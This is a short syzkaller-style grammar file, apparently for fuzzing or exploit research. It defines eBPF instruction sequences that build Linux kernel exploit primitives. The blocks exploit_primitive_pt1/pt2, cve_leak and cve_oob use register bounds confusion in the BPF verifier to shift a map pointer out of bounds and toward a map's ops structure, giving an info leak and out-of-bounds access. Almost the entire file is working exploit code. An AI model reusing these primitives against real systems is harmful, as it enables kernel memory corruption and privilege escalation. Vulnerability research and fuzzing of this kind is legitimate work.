# bpf_framed_program_k {
# 	get_map_ptr_c	bpf_insn_get_map_ptr[CORRUPT_MAP_FD, CORRUPT_MAP_REG]
# 	get_map_ptr_S	bpf_insn_get_map_ptr[STORAGE_MAP_FD, STORAGE_MAP_REG]
# 	get_map_ptr_V	bpf_insn_get_map_ptr[VALUE_MAP_FD, VALUE_MAP_REG]
# 	do_cve 			do_corrupt 		
# 	try_vul 		vul_insns
# 	complete 		mark_complete
# 	exit			BPF_EXIT_INSN
# } [packed]

do_corrupt[
	do_corrupt_leak 		cve_leak
	do_corrupt_oob 			cve_oob
] [varlen]


define UNKOWN_VALUE_REG BPF_REG_4
define CONST_REG 		BPF_REG_3
define COPY_REG 		BPF_REG_2

exploit_primitive_pt1{
	i1 	BPF_LDX_MEM[BPF_DW0, UNKOWN_VALUE_REG, VALUE_MAP_REG, 0]
	i2 	BPF_MOV64_REG[EXPLOIT_REG, UNKOWN_VALUE_REG]
	i3 	BPF_MOV32_IMM[CONST_REG, 0xFFFFFFFF]
	i4 	BPF_ALU64_IMM[BPF_LSH0, CONST_REG, 32]
	i5  BPF_ALU64_REG[BPF_AND0, EXPLOIT_REG, CONST_REG]
	i6  BPF_ALU64_IMM[BPF_ADD0, EXPLOIT_REG, 1]
	i7  BPF_MOV64_IMM[CONST_REG, 0x1]
	i8 	BPF_ALU64_IMM[BPF_LSH0, CONST_REG, 32]
	i9 	BPF_ALU64_IMM[BPF_ADD0, CONST_REG, 2]
	i10 BPF_ALU64_REG[BPF_AND0, EXPLOIT_REG, CONST_REG]
}

exploit_primitive_pt2{
	i1 	BPF_ALU64_IMM[BPF_ADD0, EXPLOIT_REG, 1]
	i2 	BPF_JMP32_IMM[BPF_JLE0, UNKOWN_VALUE_REG, 1, 1]
	i3 	BPF_EXIT_INSN
	i4 	BPF_ALU64_REG[BPF_ADD0, EXPLOIT_REG, UNKOWN_VALUE_REG]
	i5 	BPF_MOV32_REG[EXPLOIT_REG, EXPLOIT_REG]
	i6 	BPF_ALU64_IMM[BPF_AND0, EXPLOIT_REG, 1]
	i7 	BPF_MOV64_REG[COPY_REG, EXPLOIT_REG]
	i8 	BPF_ALU64_IMM[BPF_ADD0, CORRUPT_MAP_REG, 0x1000]
	i9 	BPF_ALU64_IMM[BPF_MUL0, COPY_REG, 0xfff]
	i10 BPF_ALU64_REG[BPF_SUB0, CORRUPT_MAP_REG, COPY_REG]
	i11 BPF_ALU64_REG[BPF_SUB0, CORRUPT_MAP_REG, EXPLOIT_REG]
}

cve_leak {
	p1 	exploit_primitive_pt1
	ii 	BPF_MOV32_REG[EXPLOIT_REG, EXPLOIT_REG]
}

define BPF_MAP_OPS_OFFSET           0x110-0x100

cve_oob {
	p1 	exploit_primitive_pt1
	p2 	exploit_primitive_pt2
	i1 	BPF_ALU64_IMM[BPF_MUL0, EXPLOIT_REG, BPF_MAP_OPS_OFFSET]
}